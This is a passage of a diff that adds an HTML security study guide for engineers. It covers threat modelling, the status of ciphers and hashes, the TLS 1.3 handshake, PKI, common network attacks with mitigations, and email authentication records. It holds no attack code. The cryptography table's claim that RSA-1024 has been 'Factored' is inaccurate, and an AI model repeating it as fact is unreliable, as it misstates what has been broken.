@@ -1,0 +1,1082 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Information Security — Engineering OS</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,400;0,500;1,400&family=Fraunces:ital,opsz,wght@0,9..144,300;0,9..144,700;1,9..144,300&family=DM+Sans:opsz,wght@9..40,400;9..40,500&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+:root{
+  --ink:#1a1916;--ink-2:#3d3c38;--ink-3:#6b6a64;--ink-4:#9e9c94;
+  --paper:#f5f3ee;--paper-2:#eceae3;--paper-3:#e0ddd4;
+  --rule:#d4d1c6;--rule-2:#c4c0b3;
+  --lime:#b8f060;--lime-dim:#b8f06018;
+  --amber:#e8a020;--red:#d64030;--blue:#2060c8;--teal:#18a080;
+  --mono:'IBM Plex Mono',monospace;--serif:'Fraunces',serif;--sans:'DM Sans',sans-serif;
+  --r:6px;--r-lg:12px;
+}
+body{font-family:var(--sans);font-size:15px;line-height:1.65;color:var(--ink);background:var(--paper);min-height:100vh}
+nav{position:sticky;top:0;z-index:100;background:var(--paper);border-bottom:1px solid var(--rule)}
+.nav-inner{max-width:1060px;margin:0 auto;padding:0 32px;display:flex;align-items:center;justify-content:space-between;height:52px}
+.nav-back{text-decoration:none;font-family:var(--mono);font-size:11px;color:var(--ink-3);transition:color .15s}
+.nav-back:hover{color:var(--ink)}
+.nav-badge{font-family:var(--mono);font-size:11px;color:var(--ink-4);border:1px solid var(--rule);padding:3px 10px;border-radius:12px}
+.wrap{max-width:1060px;margin:0 auto;padding:0 32px}
+@media(max-width:700px){.wrap{padding:0 20px}}
+.doc-layout{display:grid;grid-template-columns:200px 1fr;gap:64px;align-items:start;padding:48px 0 96px}
+@media(max-width:900px){.doc-layout{grid-template-columns:1fr}}
+.toc{position:sticky;top:72px;max-height:calc(100vh - 80px);overflow-y:auto}
+@media(max-width:900px){.toc{display:none}}
+.toc-label{font-family:var(--mono);font-size:10px;color:var(--ink-4);letter-spacing:.1em;text-transform:uppercase;margin-bottom:14px}
+.toc-list{list-style:none;display:flex;flex-direction:column;gap:1px}
+.toc-item a{display:block;font-family:var(--mono);font-size:11px;color:var(--ink-3);text-decoration:none;padding:5px 0 5px 12px;border-left:2px solid transparent;transition:color .15s,border-color .15s;line-height:1.4}
+.toc-item a:hover{color:var(--ink);border-left-color:var(--ink-3)}
+.toc-item.active a{color:var(--ink);border-left-color:var(--ink)}
+.toc-div{height:1px;background:var(--rule);margin:7px 0 7px 12px}
+
+/* Article */
+.article-header{margin-bottom:48px;padding-bottom:40px;border-bottom:1px solid var(--rule)}
+.art-eyebrow{display:flex;align-items:center;gap:8px;font-family:var(--mono);font-size:11px;color:var(--ink-4);letter-spacing:.08em;text-transform:uppercase;margin-bottom:20px}
+.art-badge{padding:3px 8px;border-radius:4px;background:var(--lime-dim);border:1px solid #b8f06040;color:var(--teal);font-size:10px;font-weight:500}
+h1.art-title{font-family:var(--serif);font-size:clamp(32px,4vw,52px);font-weight:700;letter-spacing:-.025em;line-height:1.05;color:var(--ink);margin-bottom:16px}
+h1.art-title em{font-style:italic;font-weight:300;color:var(--ink-3)}
+.art-subtitle{font-size:16px;color:var(--ink-2);line-height:1.75;max-width:600px}
+.art-meta{display:flex;gap:20px;margin-top:24px;flex-wrap:wrap}
+.meta-pill{display:flex;align-items:center;gap:6px;font-family:var(--mono);font-size:11px;color:var(--ink-3)}
+.meta-pill-dot{width:5px;height:5px;border-radius:50%;background:var(--rule-2)}
+
+/* Schedule */
+.schedule{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:8px;margin-bottom:48px}
+.sched-block{background:var(--paper-2);border:1px solid var(--rule);border-radius:var(--r);padding:14px}
+.sched-time{font-family:var(--mono);font-size:9px;color:var(--ink-4);margin-bottom:4px}
+.sched-topic{font-size:11px;color:var(--ink-2);font-weight:500;line-height:1.4}
+
+/* Sections */
+.sec{margin-top:60px;padding-top:60px;border-top:1px solid var(--rule)}
+.sec:first-child{margin-top:0;padding-top:0;border-top:none}
+.sec-head{display:flex;align-items:baseline;gap:10px;margin-bottom:20px}
+.sec-num{font-family:var(--mono);font-size:11px;color:var(--ink-4);width:28px;flex-shrink:0}
+.sec-title{font-family:var(--serif);font-size:clamp(20px,2.5vw,28px);font-weight:700;color:var(--ink);letter-spacing:-.02em;line-height:1.1}
+h3.sub{font-size:15px;font-weight:500;color:var(--ink);margin:28px 0 10px;display:flex;align-items:center;gap:8px}
+h3.sub::before{content:'';display:block;width:3px;height:14px;border-radius:2px;background:var(--rule-2);flex-shrink:0}
+p.body{font-size:15px;color:var(--ink-2);line-height:1.8;margin-bottom:14px}
+p.body strong{color:var(--ink);font-weight:500}
+p.body code{font-family:var(--mono);font-size:13px;background:var(--paper-2);border:1px solid var(--rule);padding:1px 5px;border-radius:3px;color:var(--ink)}
+
+/* Callout */
+.callout{border-left:3px solid var(--callout-color,var(--rule-2));background:var(--callout-bg,var(--paper-2));padding:16px 20px;border-radius:0 var(--r) var(--r) 0;margin:20px 0}
+.callout-label{font-family:var(--mono);font-size:10px;letter-spacing:.08em;text-transform:uppercase;color:var(--callout-color,var(--ink-4));margin-bottom:6px}
+.callout p{font-size:14px;color:var(--ink-2);line-height:1.7;margin:0}
+.callout p+p{margin-top:8px}
+
+/* Code block */
+.code-wrap{margin:16px 0;border-radius:var(--r-lg);overflow:hidden;border:1px solid var(--rule)}
+.code-head{display:flex;align-items:center;justify-content:space-between;background:var(--paper-2);border-bottom:1px solid var(--rule);padding:10px 16px}
+.code-lang{font-family:var(--mono);font-size:10px;color:var(--ink-4);letter-spacing:.08em;text-transform:uppercase}
+.copy-btn{font-family:var(--mono);font-size:10px;color:var(--ink-4);background:none;border:1px solid var(--rule);padding:3px 8px;border-radius:4px;cursor:pointer;transition:color .15s}
+.copy-btn:hover{color:var(--ink)}
+pre{background:var(--ink);overflow-x:auto;padding:20px 24px;margin:0;font-family:var(--mono);font-size:12.5px;line-height:1.85;color:rgba(255,255,255,.8)}
+.tc{color:rgba(255,255,255,.28)}.tk{color:#74c0fc}.ts{color:#b8f060}.tn{color:#ffa94d}
+.tp{color:rgba(255,255,255,.55)}.tt{color:#cc5de8}.tf{color:#63e6be}.tr{color:rgba(255,255,255,.8)}
+
+/* Tables */
+.tbl-wrap{overflow-x:auto;margin:16px 0}
+table{width:100%;border-collapse:collapse;font-size:13px}
+thead tr{border-bottom:2px solid var(--rule)}
+thead th{font-family:var(--mono);font-size:10px;letter-spacing:.08em;text-transform:uppercase;color:var(--ink-4);padding:8px 12px;text-align:left;font-weight:500}
+tbody tr{border-bottom:1px solid var(--rule)}
+tbody tr:last-child{border-bottom:none}
+tbody td{padding:10px 12px;color:var(--ink-2);line-height:1.5;vertical-align:top}
+tbody td:first-child{font-weight:500;color:var(--ink)}
+tbody td code{font-family:var(--mono);font-size:12px;background:var(--paper-2);padding:1px 5px;border-radius:3px}
+
+/* Threat cards */
+.threat-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:12px;margin:16px 0}
+@media(max-width:640px){.threat-grid{grid-template-columns:1fr}}
+.threat-card{background:var(--paper-2);border:1px solid var(--rule);border-radius:var(--r-lg);padding:20px;position:relative;overflow:hidden}
+.threat-card::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--tc-color,var(--rule-2))}
+.tc-sev{font-family:var(--mono);font-size:9px;color:var(--tc-color,var(--ink-4));letter-spacing:.1em;font-weight:700;text-transform:uppercase;margin-bottom:6px}
+.tc-name{font-size:14px;font-weight:500;color:var(--ink);margin-bottom:8px;line-height:1.3}
+.tc-desc{font-size:12px;color:var(--ink-3);line-height:1.65;margin-bottom:10px}
+.tc-mitigate{font-family:var(--mono);font-size:10px;color:var(--teal);line-height:1.5}
+
+/* Attack cards (expandable) */
+.atk{background:var(--paper-2);border:1px solid var(--rule);border-radius:var(--r-lg);margin:8px 0;overflow:hidden}
+.atk-head{display:flex;align-items:center;gap:14px;padding:16px 20px;cursor:pointer;transition:background .15s;user-select:none}
+.atk-head:hover{background:var(--paper-3)}
+.atk-sev{font-family:var(--mono);font-size:9px;padding:2px 8px;border-radius:10px;flex-shrink:0;font-weight:700;letter-spacing:.08em}
+.sev-critical{background:#ffeee0;color:#b04010;border:1px solid #ffccaa}
+.sev-high{background:#fff0e0;color:#a05000;border:1px solid #ffd8a0}
+.sev-med{background:#fff8e0;color:#806000;border:1px solid #ffd060}
+.atk-title{font-size:14px;font-weight:500;color:var(--ink);flex:1}
+.atk-chevron{font-size:11px;color:var(--ink-4);transition:transform .2s;flex-shrink:0}
+.atk.open .atk-chevron{transform:rotate(180deg)}
+.atk-body{display:none;padding:0 20px 20px;border-top:1px solid var(--rule)}
+.atk.open .atk-body{display:block}
+.atk-body p{font-size:13px;color:var(--ink-2);line-height:1.75;margin-top:14px}
+.atk-body p strong{color:var(--ink);font-weight:500}
+.atk-body p code{font-family:var(--mono);font-size:12px;background:var(--paper-3);padding:1px 5px;border-radius:3px}
+
+/* Checkpoint */
+.checkpoint{background:var(--ink);border-radius:var(--r-lg);padding:28px 32px;margin:24px 0}
+.cp-label{font-family:var(--mono);font-size:10px;color:var(--lime);letter-spacing:.12em;text-transform:uppercase;margin-bottom:8px}
+.cp-title{font-family:var(--serif);font-size:18px;font-weight:700;color:var(--paper);margin-bottom:14px}
+.cp-list{list-style:none;display:flex;flex-direction:column;gap:7px}
+.cp-item{display:flex;gap:10px;font-size:13px;color:rgba(245,243,238,.7);line-height:1.6}
+.cp-item::before{content:'→';color:var(--lime);flex-shrink:0;font-family:var(--mono)}
+
+/* Flash cards */
+.fc-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:10px;margin:16px 0}
+@media(max-width:600px){.fc-grid{grid-template-columns:1fr}}
+.fc{background:var(--paper-2);border:1px solid var(--rule);border-radius:var(--r-lg);padding:18px}
+.fc-q{font-family:var(--mono);font-size:11px;color:var(--ink);margin-bottom:10px;font-weight:500;line-height:1.5}
+.fc-a{font-size:13px;color:var(--ink-2);line-height:1.65;border-top:1px solid var(--rule);padding-top:10px}
+.fc-a code{font-family:var(--mono);font-size:11px;background:var(--paper-3);padding:1px 5px;border-radius:3px}
+
+/* Tool pills */
+.tool-row{display:flex;flex-wrap:wrap;gap:6px;margin:12px 0}
+.tool-pill{font-family:var(--mono);font-size:11px;color:var(--ink-2);background:var(--paper-3);border:1px solid var(--rule);padding:4px 10px;border-radius:20px}
+
+footer{border-top:1px solid var(--rule);padding:28px 0}
+</style>
+</head>
+<body>
+
+<nav>
+  <div class="nav-inner">
+    <a href="index.html" class="nav-back">← Platform</a>
+    <div class="nav-badge">🔒 Security · 10h · Staff Level</div>
+  </div>
+</nav>
+
+<div class="wrap">
+<div class="doc-layout">
+
+  <!-- TOC -->
+  <aside class="toc">
+    <div class="toc-label">Contents</div>
+    <ul class="toc-list">
+      <li class="toc-item"><a href="#foundations">Foundations</a></li>
+      <li class="toc-item"><a href="#crypto">Cryptography</a></li>
+      <li class="toc-item"><a href="#network">Network Security</a></li>
+      <li class="toc-item"><a href="#appsec">Application Security</a></li>
+      <li class="toc-item"><a href="#attacks">Attack Taxonomy</a></li>
+      <div class="toc-div"></div>
+      <li class="toc-item"><a href="#authn">AuthN &amp; AuthZ</a></li>
+      <li class="toc-item"><a href="#secrets">Secrets Management</a></li>
+      <li class="toc-item"><a href="#cloud">Cloud Security</a></li>
+      <li class="toc-item"><a href="#k8s">K8s Security</a></li>
+      <div class="toc-div"></div>
+      <li class="toc-item"><a href="#incident">Incident Response</a></li>
+      <li class="toc-item"><a href="#compliance">Compliance</a></li>
+      <li class="toc-item"><a href="#tools">Tools Reference</a></li>
+      <li class="toc-item"><a href="#flashcards">Flash Cards</a></li>
+    </ul>
+  </aside>
+
+  <!-- ARTICLE -->
+  <article>
+
+    <div class="article-header">
+      <div class="art-eyebrow">
+        <span class="art-badge">Security</span>
+        Cryptography · AppSec · Cloud · Incident Response · Compliance
+      </div>
+      <h1 class="art-title">Information Security<br><em>for Engineers</em></h1>
+      <p class="art-subtitle">
+        Everything a senior engineer needs to own security — not just avoid it. Cryptographic primitives, the full attack taxonomy, AuthN/AuthZ internals, secrets management, cloud and K8s hardening, incident response, and compliance frameworks. Written for engineers who ship code, not for auditors.
+      </p>
+      <div class="art-meta">
+        <div class="meta-pill"><div class="meta-pill-dot"></div>~10 hours</div>
+        <div class="meta-pill"><div class="meta-pill-dot"></div>Staff-level depth</div>
+        <div class="meta-pill"><div class="meta-pill-dot"></div>No beginner scaffolding</div>
+      </div>
+    </div>
+
+    <!-- SESSION SCHEDULE -->
+    <div class="schedule">
+      <div class="sched-block"><div class="sched-time">H 0–1.5</div><div class="sched-topic">Crypto Primitives</div></div>
+      <div class="sched-block"><div class="sched-time">H 1.5–3</div><div class="sched-topic">Network + TLS</div></div>
+      <div class="sched-block"><div class="sched-time">H 3–4.5</div><div class="sched-topic">AppSec + OWASP</div></div>
+      <div class="sched-block"><div class="sched-time">H 4.5–6</div><div class="sched-topic">AuthN / AuthZ</div></div>
+      <div class="sched-block"><div class="sched-time">H 6–7.5</div><div class="sched-topic">Cloud + K8s</div></div>
+      <div class="sched-block"><div class="sched-time">H 7.5–9</div><div class="sched-topic">IR + Compliance</div></div>
+      <div class="sched-block"><div class="sched-time">H 9–10</div><div class="sched-topic">Tools + Review</div></div>
+    </div>
+
+    <!-- 01 FOUNDATIONS -->
+    <div id="foundations" class="sec">
+      <div class="sec-head"><span class="sec-num">01</span><h2 class="sec-title">Security Foundations</h2></div>
+
+      <p class="body">Security is a property of a system, not a feature you bolt on. The foundational mental model: every security control exists to protect a <strong>confidentiality</strong>, <strong>integrity</strong>, or <strong>availability</strong> property of a specific asset. Before designing any control, name the asset, the threat actor, the attack vector, and the property being protected.</p>
+
+      <h3 class="sub">The CIA Triad — extended</h3>
+      <p class="body"><strong>Confidentiality:</strong> data is accessible only to authorised parties. Controls: encryption at rest and in transit, access control lists, least-privilege roles, data masking. Threat: an attacker reads customer PII from an unsecured S3 bucket.</p>
+      <p class="body"><strong>Integrity:</strong> data has not been tampered with, by an attacker or by an accidental write. Controls: cryptographic signatures, checksums, immutable audit logs, write-once storage. Threat: an attacker modifies a financial transaction record in transit.</p>
+      <p class="body"><strong>Availability:</strong> the system is accessible when legitimate users need it. Controls: redundancy, rate limiting, DDoS protection, circuit breakers, capacity planning. Threat: a DDoS attack floods the API gateway, making the service unreachable.</p>
+      <p class="body"><strong>Non-repudiation (extension):</strong> an action can be attributed to a specific actor and cannot be denied. Controls: signed audit logs, digital signatures on transactions, tamper-evident logs in append-only stores. Required for financial systems and legal compliance.</p>
+
+      <h3 class="sub">Defence in Depth — the correct mental model</h3>
+      <p class="body">A single control failing should not result in a breach. Stack independent layers: network perimeter → host firewall → service authentication → data encryption → audit logging. An attacker must defeat all layers. Design each layer assuming all others are already compromised.</p>
+
+      <div class="callout" style="--callout-color:var(--red);--callout-bg:#ffeee0">
+        <div class="callout-label">Security anti-pattern</div>
+        <p>Security through obscurity — hiding the algorithm, the endpoint, or the key location instead of properly securing it. This fails the Kerckhoffs principle: a cryptosystem should be secure even if everything about it except the key is public knowledge. Your API endpoint will be discovered. Your binary will be reverse-engineered. Design as if the attacker already knows everything except the secrets.</p>
+      </div>
+
+      <h3 class="sub">Threat Modelling — STRIDE</h3>
+      <p class="body">Before writing a security control, run STRIDE against the component you're protecting. STRIDE is a threat taxonomy that ensures you've considered every threat class.</p>
+      <div class="tbl-wrap">
+        <table>
+          <thead><tr><th>Threat</th><th>Violates</th><th>Example</th><th>Control</th></tr></thead>
+          <tbody>
+            <tr><td><strong>S</strong>poofing</td><td>Authentication</td><td>Attacker impersonates another user by forging JWTs</td><td>Mutual TLS, signed tokens, short TTLs</td></tr>
+            <tr><td><strong>T</strong>ampering</td><td>Integrity</td><td>Man-in-the-middle modifies API response payload</td><td>TLS, HMAC signatures, response signing</td></tr>
+            <tr><td><strong>R</strong>epudiation</td><td>Non-repudiation</td><td>User denies placing an order that was charged</td><td>Signed audit log, immutable event store</td></tr>
+            <tr><td><strong>I</strong>nformation disclosure</td><td>Confidentiality</td><td>Stack trace in 500 error exposes DB schema</td><td>Sanitise error responses, structured logging</td></tr>
+            <tr><td><strong>D</strong>enial of service</td><td>Availability</td><td>Brute-force login floods auth service</td><td>Rate limiting, account lockout, CAPTCHA</td></tr>
+            <tr><td><strong>E</strong>levation of privilege</td><td>Authorisation</td><td>Regular user accesses admin endpoint via IDOR</td><td>Authorisation checks on every request, RBAC</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3 class="sub">Principle of Least Privilege</h3>
+      <p class="body">Every component — a service, a user, a process, an IAM role — should have exactly the permissions it needs for its specific function and nothing more. This limits blast radius when a component is compromised. In practice: your notification service should not have database admin access. Your CI pipeline should not have production write access. Your app process should not run as root.</p>
+    </div>
+
+    <!-- 02 CRYPTOGRAPHY -->
+    <div id="crypto" class="sec">
+      <div class="sec-head"><span class="sec-num">02</span><h2 class="sec-title">Cryptography</h2></div>
+
+      <p class="body">You don't need to implement cryptographic algorithms — you need to know which ones are safe to use, which are broken, and why the distinction matters. Using a broken algorithm (MD5, SHA-1, DES, RC4) in production is a critical vulnerability even if everything else is correct.</p>
+
+      <h3 class="sub">Symmetric Encryption</h3>
+      <p class="body">Same key for encryption and decryption. Fast — suitable for bulk data. The key distribution problem: how do you securely share the key?</p>
+
+      <div class="tbl-wrap">
+        <table>
+          <thead><tr><th>Algorithm</th><th>Key size</th><th>Status</th><th>Use for</th></tr></thead>
+          <tbody>
+            <tr><td>AES-256-GCM</td><td>256-bit</td><td style="color:var(--teal);font-weight:500">✓ Current standard</td><td>Data encryption at rest and in transit. GCM mode provides authenticated encryption — both confidentiality AND integrity in one pass.</td></tr>
+            <tr><td>AES-128-GCM</td><td>128-bit</td><td style="color:var(--teal);font-weight:500">✓ Acceptable</td><td>Same as above. 128-bit is currently unbroken. Prefer 256-bit for new systems.</td></tr>
+            <tr><td>ChaCha20-Poly1305</td><td>256-bit</td><td style="color:var(--teal);font-weight:500">✓ Modern alternative</td><td>Faster than AES on systems without hardware AES acceleration. TLS 1.3 cipher suite. Used in WireGuard.</td></tr>
+            <tr><td>AES-CBC</td><td>128/256-bit</td><td style="color:var(--amber);font-weight:500">⚠ Use with HMAC</td><td>CBC alone provides no integrity. Must be combined with HMAC (Encrypt-then-MAC). Vulnerable to padding oracle attacks if misused.</td></tr>
+            <tr><td>DES / 3DES</td><td>56/168-bit</td><td style="color:var(--red);font-weight:500">✗ Broken / Legacy</td><td>DES broken. 3DES deprecated by NIST 2023. Never use in new systems.</td></tr>
+            <tr><td>RC4</td><td>Variable</td><td style="color:var(--red);font-weight:500">✗ Broken</td><td>Biased output, known attacks. Prohibited in TLS since RFC 7465.</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3 class="sub">Asymmetric Encryption</h3>
+      <p class="body">Public key encrypts, private key decrypts (or vice versa for signing). Solves the key distribution problem — distribute the public key freely. Much slower than symmetric — use to exchange a symmetric session key, then switch to symmetric for bulk data. This is exactly what TLS does.</p>
+
+      <div class="tbl-wrap">
+        <table>
+          <thead><tr><th>Algorithm</th><th>Key size</th><th>Status</th><th>Notes</th></tr></thead>
+          <tbody>
+            <tr><td>RSA-2048</td><td>2048-bit</td><td style="color:var(--teal)">✓ Acceptable</td><td>Widely supported. 2048-bit minimum. Prefer 4096-bit for long-term keys. Vulnerable to quantum computers (Shor's algorithm) — plan migration.</td></tr>
+            <tr><td>RSA-4096</td><td>4096-bit</td><td style="color:var(--teal)">✓ Preferred</td><td>Slower key operations but stronger. Use for CA signing keys and long-lived certificates.</td></tr>
+            <tr><td>ECDSA P-256</td><td>256-bit ECC</td><td style="color:var(--teal)">✓ Modern standard</td><td>Equivalent security to RSA-3072 with much smaller keys. Default in TLS 1.3. Used in JWT signing, TLS certificates.</td></tr>
+            <tr><td>Ed25519</td><td>256-bit ECC</td><td style="color:var(--teal)">✓ Best current choice</td><td>Faster than ECDSA, constant-time implementation (immune to timing attacks), no random number dependency in signing. Use for SSH keys, code signing.</td></tr>
+            <tr><td>RSA-1024</td><td>1024-bit</td><td style="color:var(--red)">✗ Broken</td><td>Factored. Do not use. Any certificate signed with 1024-bit RSA is insecure.</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3 class="sub">Hashing</h3>
+      <p class="body">One-way function. Used for: password storage, data integrity verification, digital signatures (hash-then-sign), deduplication. A hash function must be collision-resistant (hard to find two inputs with the same output), preimage-resistant (hard to find input given output), and second-preimage-resistant.</p>
+
+      <div class="tbl-wrap">
+        <table>
+          <thead><tr><th>Algorithm</th><th>Output</th><th>Status</th><th>Use for</th></tr></thead>
+          <tbody>
+            <tr><td>SHA-256</td><td>256-bit</td><td style="color:var(--teal)">✓ Standard</td><td>General-purpose integrity, HMAC, certificate fingerprints, Git object IDs.</td></tr>
+            <tr><td>SHA-384 / SHA-512</td><td>384/512-bit</td><td style="color:var(--teal)">✓ Strong</td><td>Higher security margin. Use when storing long-term data or when SHA-256 collision resistance is a concern.</td></tr>
+            <tr><td>SHA-3 (Keccak)</td><td>Variable</td><td style="color:var(--teal)">✓ Alternative</td><td>Completely different construction from SHA-2. Use when you need defence against SHA-2 weaknesses or for post-quantum readiness.</td></tr>
+            <tr><td>bcrypt</td><td>60-char string</td><td style="color:var(--teal)">✓ Passwords</td><td>Designed for password hashing. Slow by design (configurable work factor). Salt built-in. Use cost factor ≥12.</td></tr>
+            <tr><td>Argon2id</td><td>Variable</td><td style="color:var(--teal)">✓ Best for passwords</td><td>Winner of Password Hashing Competition 2015. Memory-hard — resists GPU and ASIC attacks. Preferred over bcrypt for new systems.</td></tr>
+            <tr><td>PBKDF2</td><td>Variable</td><td style="color:var(--amber)">⚠ Acceptable legacy</td><td>NIST-approved, FIPS-compliant. Not memory-hard — more vulnerable to GPU cracking than Argon2id.</td></tr>
+            <tr><td>MD5</td><td>128-bit</td><td style="color:var(--red)">✗ Broken</td><td>Collision attacks demonstrated. Never use for security. Only acceptable for non-security checksums (file dedup).</td></tr>
+            <tr><td>SHA-1</td><td>160-bit</td><td style="color:var(--red)">✗ Broken</td><td>SHAttered attack (2017) demonstrated collision. Deprecated in TLS, certificates, code signing.</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3 class="sub">HMAC — Message Authentication Code</h3>
+      <p class="body">HMAC combines a secret key with a hash function: <code>HMAC(key, message) = H(key ⊕ opad || H(key ⊕ ipad || message))</code>. It provides both data integrity and authenticity — only someone with the secret key can produce a valid HMAC. Use HMAC-SHA256 for API request signing, webhook verification, and cookie integrity.</p>
+      <p class="body"><strong>Timing attack on HMAC comparison:</strong> never compare HMACs with <code>==</code>. A standard string comparison short-circuits on the first byte mismatch — an attacker can measure response time to learn how many bytes of the HMAC they've guessed correctly. Always use constant-time comparison: <code>hmac.Equal()</code> in Go, <code>hmac.compare_digest()</code> in Python.</p>
+
+      <h3 class="sub">TLS — How the Handshake Actually Works</h3>
+      <p class="body">TLS 1.3 (the current version) dramatically simplified the handshake compared to TLS 1.2. The handshake completes in <strong>1-RTT</strong> (down from 2-RTT in 1.2), with 0-RTT resumption available for returning connections.</p>
+
+      <div class="code-wrap">
+        <div class="code-head"><span class="code-lang">TLS 1.3 handshake — annotated</span><button class="copy-btn">copy</button></div>
+        <pre><span class="tc">Client                          Server</span>
+  │                                │
+  │──── ClientHello ───────────────▶│  <span class="tc">supported cipher suites,</span>
+  │     + key_share (ECDHE pubkey)  │  <span class="tc">random nonce, session ID</span>
+  │                                │
+  │◀─── ServerHello ───────────────│  <span class="tc">chosen cipher suite,</span>
+  │     + key_share (ECDHE pubkey)  │  <span class="tc">server ECDHE public key</span>
+  │                                │
+  │  <span class="tc">Both sides now derive the same</span>  │
+  │  <span class="tc">session key via ECDHE: no key</span>   │
+  │  <span class="tc">was ever transmitted.</span>           │
+  │                                │
+  │◀─── {Certificate} ─────────────│  <span class="tc">server's X.509 cert (encrypted)</span>
+  │◀─── {CertificateVerify} ───────│  <span class="tc">signature over handshake transcript</span>
+  │◀─── {Finished} ────────────────│  <span class="tc">HMAC of entire handshake</span>
+  │                                │
+  │──── {Finished} ────────────────▶│  <span class="tc">client confirms handshake</span>
+  │                                │
+  │◀══════ Application Data ══════▶│  <span class="tc">encrypted with AES-256-GCM</span>
+  │                                │  <span class="tc">or ChaCha20-Poly1305</span>
+
+<span class="tc">Key exchange: ECDHE (ephemeral Diffie-Hellman on elliptic curve)</span>
+<span class="tc">Forward secrecy: session key is derived fresh each time.</span>
+<span class="tc">Compromising the server's private key does NOT decrypt past sessions.</span>
+<span class="tc">TLS 1.3 removed: RSA key exchange, CBC mode, SHA-1, MD5, RC4</span></pre>
+      </div>
+
+      <h3 class="sub">PKI — Certificates and the Chain of Trust</h3>
+      <p class="body">An X.509 certificate binds a public key to an identity (a domain name, an organisation). It is signed by a Certificate Authority (CA). Your browser trusts a certificate if it chains up to a root CA in the browser's trust store.</p>
+      <p class="body"><strong>Certificate fields to understand:</strong> Subject (who it's for), Issuer (who signed it), Subject Alternative Names (SAN — the actual list of domains/IPs it's valid for), Not Before / Not After (validity window), Key Usage (what the key can be used for: signing, key exchange, etc.), Extended Key Usage (TLS server auth, code signing, email), Basic Constraints (is this a CA that can sign other certs?).</p>
+      <p class="body"><strong>Certificate Transparency (CT):</strong> since 2018, all publicly trusted TLS certificates must be logged in public CT logs. This prevents a CA from issuing a secret certificate for your domain without your knowledge. Monitor CT logs for your domains using crt.sh or Facebook's CT monitor.</p>
+    </div>
+
+    <!-- 03 NETWORK SECURITY -->
+    <div id="network" class="sec">
+      <div class="sec-head"><span class="sec-num">03</span><h2 class="sec-title">Network Security</h2></div>
+
+      <h3 class="sub">Firewall Rules and Network Segmentation</h3>
+      <p class="body">Default-deny inbound, default-deny lateral movement between segments. The flat network (everything can reach everything) is the most common enterprise security failure. Segment by trust level: internet-facing DMZ → application tier → database tier. No direct internet-to-database path. Each tier's firewall allows only the specific ports and source IPs needed.</p>
+      <p class="body"><strong>Stateful vs stateless firewalls:</strong> stateful firewalls track connection state — they allow return traffic for established outbound connections without explicit rules. Stateless firewalls require explicit rules for both directions. AWS Security Groups are stateful. AWS Network ACLs are stateless.</p>
+
+      <h3 class="sub">Common Network Attacks</h3>
+      <div class="threat-grid">
+        <div class="threat-card" style="--tc-color:var(--red)">
+          <div class="tc-sev">Critical</div>
+          <div class="tc-name">Man-in-the-Middle (MITM)</div>
+          <div class="tc-desc">Attacker intercepts traffic between client and server. Can read or modify unencrypted traffic. Can downgrade TLS if misconfigured.</div>
+          <div class="tc-mitigate">→ TLS everywhere, HSTS, certificate pinning for mobile, verify cert chains</div>
+        </div>
+        <div class="threat-card" style="--tc-color:var(--red)">
+          <div class="tc-sev">Critical</div>
+          <div class="tc-name">DNS Hijacking / Cache Poisoning</div>
+          <div class="tc-desc">Attacker corrupts DNS cache to redirect traffic to a malicious server. DNSSEC-unsigned zones are vulnerable to Kaminsky attack.</div>
+          <div class="tc-mitigate">→ DNSSEC, DNS-over-HTTPS/TLS, CAA records to restrict cert issuance</div>
+        </div>
+        <div class="threat-card" style="--tc-color:var(--amber)">
+          <div class="tc-sev">High</div>
+          <div class="tc-name">DDoS — Volumetric</div>
+          <div class="tc-desc">Attacker floods network with traffic (UDP amplification, ICMP flood) to exhaust bandwidth. Amplification attacks use UDP protocols with large response:request ratios (DNS: 50×, NTP: 556×, Memcached: 51,000×).</div>
+          <div class="tc-mitigate">→ Upstream scrubbing (Cloudflare, Akamai), anycast routing, BCP38 filtering</div>
+        </div>
+        <div class="threat-card" style="--tc-color:var(--amber)">
+          <div class="tc-sev">High</div>
+          <div class="tc-name">ARP Spoofing</div>
+          <div class="tc-desc">On a local network, attacker broadcasts fake ARP replies to associate their MAC address with a legitimate IP. Redirects all traffic through attacker's machine. Prerequisite for many MITM attacks on LANs.</div>
+          <div class="tc-mitigate">→ Dynamic ARP inspection (DAI), static ARP entries for critical hosts, 802.1X port auth</div>
+        </div>
+      </div>
+
+      <h3 class="sub">VPN and Zero Trust</h3>
+      <p class="body"><strong>Traditional VPN:</strong> once inside the VPN, users have broad network access — the perimeter is "trusted". A single compromised VPN credential gives attacker lateral movement across the entire internal network.</p>
+      <p class="body"><strong>Zero Trust Network Access (ZTNA):</strong> "never trust, always verify." Every request is authenticated and authorised regardless of network origin. Principles: verify identity on every request (not just at login), grant minimum necessary access per application (not per network), assume breach — monitor and log everything. Implemented via identity-aware proxies (Google BeyondCorp, Cloudflare Access, Zscaler).</p>
+
+      <h3 class="sub">DNS Security</h3>
+      <p class="body"><strong>SPF (Sender Policy Framework):</strong> TXT record listing which IP ranges are allowed to send email for your domain. Prevents basic email spoofing. <code>v=spf1 include:_spf.google.com ~all</code></p>
+      <p class="body"><strong>DKIM (DomainKeys Identified Mail):</strong> email signing using RSA or Ed25519. The sending server signs each email with the private key; receivers verify using the public key in your DNS TXT record. Proves the email was sent by an authorised server and wasn't modified in transit.</p>
+      <p class="body"><strong>DMARC:</strong> policy that tells receivers what to do when SPF and DKIM fail. <code>p=reject</code> means reject emails that fail both checks. Also enables aggregate and forensic reporting so you can monitor spoofing attempts against your domain.</p>
